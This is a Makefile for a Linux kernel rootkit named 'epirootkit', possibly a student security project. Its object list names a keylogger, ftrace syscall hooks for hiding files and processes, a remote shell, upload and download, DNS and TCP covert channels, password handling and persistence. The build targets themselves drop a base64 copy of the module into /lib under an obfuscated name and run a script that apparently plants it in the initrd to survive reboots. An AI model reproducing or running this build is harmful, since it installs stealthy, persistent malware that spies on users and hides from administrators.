KERNELDIR := /lib/modules/$(shell uname -r)/build
PWD       := $(shell pwd)

ccflags-y := 								    \
    -I$(src) 							        \
    -I$(src)/include 					        \
    -I$(src)/transfer/include 					\
    -I$(src)/interceptor/core/include 	        \
    -I$(src)/interceptor/hooks/alterate         \
    -I$(src)/interceptor/hooks/forbid 	        \
    -I$(src)/interceptor/hooks/hide             \
    -I$(src)/utils/io 					        \
    -I$(src)/utils/ulist 				        \
    -I$(src)/utils/crypto                       \
    -I$(src)/utils/sysinfo                      \
    -I$(src)/network/core					    \
    -I$(src)/passwd 				            \
    -I$(src)/persist     				        \

obj-m    := epirootkit.o

epirootkit-objs :=                              \
    main.o                                      \
    socat.o                                     \
    vanish.o                                    \
    cmd.o                                       \
    userland.o                                  \
    epikeylog.o                                 \
    utils/io/io.o                               \
	utils/crypto/hash.o                         \
	utils/crypto/aes.o                          \
    utils/ulist/ulist.o                         \
    utils/sysinfo/sysinfo.o                     \
    network/core/network.o                      \
	network/protocols/tcp/socket.o              \
    network/protocols/tcp/worker.o              \
    network/protocols/dns/dns.o                 \
    network/protocols/dns/worker.o              \
    interceptor/core/init.o                     \
    interceptor/core/array.o                    \
    interceptor/core/menu.o                     \
    interceptor/core/ftrace.o                   \
    interceptor/hooks/alterate/alterate.o       \
    interceptor/hooks/alterate/alterate_api.o   \
    interceptor/hooks/forbid/forbid.o           \
    interceptor/hooks/forbid/forbid_api.o       \
    interceptor/hooks/hide/hide.o               \
    interceptor/hooks/hide/hide_api.o           \
    interceptor/misc/ghost.o                    \
    transfer/download.o                         \
    transfer/upload.o                           \
    passwd/passwd.o

all: modules

modules:
	@./scripts/generate.sh
	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules
	@mkdir -p /lib/epirootkit/
	@base64 epirootkit.ko > /lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv
	@./scripts/romance/initrd.sh

debug:
	@./scripts/generate.sh
	$(MAKE) -C $(KERNELDIR) M=$(PWD) EXTRA_CFLAGS="-DDEBUG=1" modules
	@mkdir -p /lib/epirootkit/
	@base64 epirootkit.ko > /lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv
	@./scripts/romance/initrd.sh

clean:
	$(MAKE) -C $(KERNELDIR) M=$(PWD) clean

.PHONY: all modules clean
